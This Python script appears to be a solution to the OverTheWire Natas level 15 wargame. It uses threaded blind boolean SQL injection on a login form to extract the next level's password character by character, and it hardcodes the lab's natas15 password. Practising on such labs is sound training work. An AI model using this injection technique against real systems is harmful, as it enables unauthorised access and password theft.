import urllib.request
import threading


def main():
    # Credentials
    url = "http://natas15.natas.labs.overthewire.org"
    username = "natas15"
    natas15_pwd = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB" # <- Change This!

    characters = "abcdefghijklmnopqrstuvwxyz"
    characters += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    characters += "1234567890"

    bandit16_pwd = []
    threads = []

    def test_password(character, password):
        # Authentication
        password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
        password_mgr.add_password(None, url, username, natas15_pwd)
        handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
        opener = urllib.request.build_opener(handler)
        opener.open(url)
        urllib.request.install_opener(opener)

        # SQL Injection
        payload = f'natas16" AND password LIKE BINARY "{password + character}%"-- -'
        data = {"username": payload}
        data = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=data)
        resp = urllib.request.urlopen(req)

        if b"This user exists" in resp.read():
            bandit16_pwd.append(character)

    for _ in range(32):
        password = "".join(bandit16_pwd)
        print(password)

        # For every character it creates a thread that make a request to the webpage
        for character in characters:
            t = threading.Thread(target=test_password, args=(character, password))
            threads.append(t)

        for x in threads:
            x.start()

        for x in threads:
            x.join()
        threads = []

    bandit16_pwd = "".join(bandit16_pwd)
    print(bandit16_pwd)


if __name__ == "__main__":
    main()
